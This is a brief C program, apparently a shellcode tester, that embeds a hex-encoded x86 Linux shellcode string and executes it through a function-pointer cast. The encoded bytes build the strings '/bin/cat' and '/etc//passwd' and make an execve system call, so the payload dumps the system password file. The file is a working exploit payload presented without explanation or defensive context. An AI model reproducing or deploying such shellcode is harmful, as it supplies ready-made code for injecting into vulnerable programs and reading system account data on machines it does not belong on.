#include <stdio.h> 
const char shellcode[]="\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"; 
int main() 
 { 
   (*(void (*)()) shellcode)(); 
   return 0; 
}          
